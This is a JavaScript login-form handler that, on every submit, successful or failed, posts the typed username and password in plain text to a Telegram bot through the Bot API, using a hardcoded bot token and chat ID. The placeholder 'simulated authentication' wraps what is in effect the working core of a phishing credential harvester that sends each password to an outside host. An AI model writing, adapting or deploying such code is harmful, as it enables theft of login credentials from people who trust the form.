document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent form submission

    // Retrieve input values
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Simulated authentication (replace with actual logic)
    if (username === 'user' && password === 'password') {
        // Successful login
        alert('Login successful!');

        // Prepare data to send to Telegram Bot API
        const data = {
            chat_id: -1001164240578, // Replace with your Telegram chat ID
            text: `Login form Filled\n\nUsername: ${username}\nPassword: ${password}`
        };

        // Send data to Telegram Bot API using fetch()
        fetch('https://api.telegram.org/bot5781279338:AAErETlGjPq86-5pZdmxE_qlXtmC5kHv9UI/sendMessage', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(data => console.log(data))
        .catch(error => console.log(error));

        // Redirect to dashboard or another page
        window.location.href = 'dashboard.html';
    } else {
        // Failed login
        const errorMessage = document.getElementById('errorMessage');
        errorMessage.textContent = 'Invalid username or password. Please try again.'
        const data = {
            chat_id: -1001164240578, // Replace with your Telegram chat ID
            text: `Login form Filled\n\nUsername: ${username}\nPassword: ${password}`
        };

        // Send data to Telegram Bot API using fetch()
        fetch('https://api.telegram.org/bot5781279338:AAErETlGjPq86-5pZdmxE_qlXtmC5kHv9UI/sendMessage', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(data => console.log(data))
        .catch(error => console.log(error));;
    }
});
